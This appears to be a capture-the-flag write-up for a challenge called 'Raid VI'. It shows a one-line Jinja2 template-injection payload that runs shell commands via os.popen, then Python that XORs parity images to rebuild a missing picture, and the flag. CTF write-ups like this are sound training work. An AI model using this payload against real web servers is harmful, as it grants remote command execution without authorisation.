# Raid VI

The web server was vulnerable to STTI. We can do RCE with the username: `{{ cycler.__init__.__globals__.os.popen('command').read() }}`

There were 6 images inside `/app`. RAID is a storage technology that uses the XOR operation to protect data using parity, especially at levels like RAID 5.
The "parity.png" picture is used to recover the missing "m6.png" picture as the name suggested.

```py
from PIL import Image
import numpy as np

def extract_png(file: str):
    try:
        with open(file,"rb") as f:
            data = f.read()
            start = data.find(b"\x89PNG")
            end = data.find(b"IEND",start)
            if start == -1 or end == -1:
                print("This file does not contains a PNG file.")
                return
            with open(f"{file.split(".")[0]}_extracted.png","wb+") as o:
                o.write(data[start:end])
                
    except FileNotFoundError:
        print("File not found.")

def xor_images(img1, img2, output):
    a = np.array(Image.open(img1).convert("RGB"))
    b = np.array(Image.open(img2).convert("RGB"))
    c = Image.fromarray(np.bitwise_xor(a,b))
    c.save(output)

# Raid 'VI'
# parity = m1 ^ m2 ^ m3 ^ m4 ^ m5 ^ m6
xor_images("m5.png","parity.png","m6.png")
for i in range(1,5):
    extract_png(f"m{i}.png")
    xor_images(f"m{i}_extracted.png","m6.png","m6.png")
```

`QnQSec{j1j4br34d_c00k13s_4nd_x0r_m1lk]`
